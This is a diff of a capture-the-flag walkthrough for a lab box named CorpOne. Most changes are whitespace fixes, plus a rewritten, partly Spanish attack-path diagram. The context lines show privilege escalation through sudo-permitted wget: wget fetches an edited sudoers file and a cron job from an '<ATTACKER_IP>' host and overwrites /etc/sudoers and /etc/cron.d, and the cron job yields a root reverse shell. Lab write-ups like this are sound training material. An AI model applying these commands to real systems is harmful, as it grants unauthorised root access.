@@ -29,9 +29,9 @@ nmap -sC -sV -O <TARGET_IP>
 ```
 
 ```
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
-80/tcp open  http    Apache httpd 2.4.18
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open http Apache httpd 2.4.18
 ```
 
 Two services: SSH on port 22 and a web server on port 80. Navigating to `http://<TARGET_IP>` shows the default Apache page. Nothing interesting at first glance, but the page source reveals this comment:
@@ -90,8 +90,8 @@ sudo -l
 
 ```
 User jessie may run the following commands on CorpOne:
-    (ALL : ALL) ALL
-    (root) NOPASSWD: /usr/bin/wget
+ (ALL : ALL) ALL
+ (root) NOPASSWD: /usr/bin/wget
 ```
 
 The standard approach most use is reading a privileged file directly, assuming the path is /root/root.txt: 
@@ -250,7 +250,7 @@ Save the received content, stripping the HTTP headers, as a local file named `su
 Append this line to the file:
 
 ```
-jessie  ALL=(root) NOPASSWD: /bin/bash
+jessie ALL=(root) NOPASSWD: /bin/bash
 ```
 
 > A malformed `sudoers` file can break `sudo` entirely. Don't remove any existing lines — just append this one. If in doubt, `visudo -c -f sudoers` validates the syntax before deploying.
@@ -270,7 +270,7 @@ sudo /usr/bin/wget http://<ATTACKER_IP>:8000/sudoers -O /etc/sudoers
 ```
 
 ```
-/etc/sudoers   100%[============================>]   821  --.-KB/s   in 0s
+/etc/sudoers 100%[============================>] 821 --.-KB/s in 0s
 ```
 
 **Step 4 — Get a root shell**
@@ -348,7 +348,7 @@ sudo wget http://<ATTACKER_IP>:8000/pwned_cron -O /etc/cron.d/pwned
 ```
 
 ```
-/etc/cron.d/pwned   100%[============================>]   143  --.-KB/s   in 0s
+/etc/cron.d/pwned 100%[============================>] 143 --.-KB/s in 0s
 ```
 
 Wait up to 60 seconds. When cron fires the job, the listener catches the connection:
@@ -367,20 +367,28 @@ uid=0(root) gid=0(root) groups=0(root)
 
 <div class="mermaid">
 graph TD
-    A["nmap scan"] --> B["Port 80\nApache default page"]
-    B --> C["HTML source comment\nusername: jessie"]
-    B --> D["gobuster\nweb enumeration"]
-    D --> E["Indexed .ssh directory\n/sitemap/.ssh/id rsa"]
-    C --> F["SSH access\njessie - private key"]
-    E --> F
-    F --> G["sudo -l\nNOPASSWD: /usr/bin/wget"]
-    G --> V1["Vector 1\n--post-file\narbitrary file read"]
-    G --> V2["Vector 2\n/etc/passwd overwrite\nnew uid=0 user"]
-    G --> V3["Vector 3\n/etc/sudoers overwrite\nNOPASSWD: /bin/bash"]
-    G --> V4["Vector 4\ncron job injection\nreverse shell"]
-    V2 --> R["root"]
-    V3 --> R
-    V4 --> R
+ subgraph RECON["RECON"]
+  A["nmap scan puerto 80"]
+ end
+ 
+ subgraph ENUM["ENUMERATION"]
+  B["HTML comment descubierto"] --> C["username: jessie"]
+  D["gobuster enumeracion"] --> E["Directorio .ssh indexado"]
+ end
+ 
+ subgraph EXPL["EXPLOITATION"]
+  F["SSH access con private key"]
+ end
+ 
+ subgraph PRIVESC["PRIVESC"]
+  G["sudo -l detecta wget NOPASSWD"] --> H["wget como root exploited"]
+  H --> I["root access obtenido"]
+ end
+ 
+ A --> B
+ C --> D
+ E --> F
+ F --> G
 </div>
 
 ---
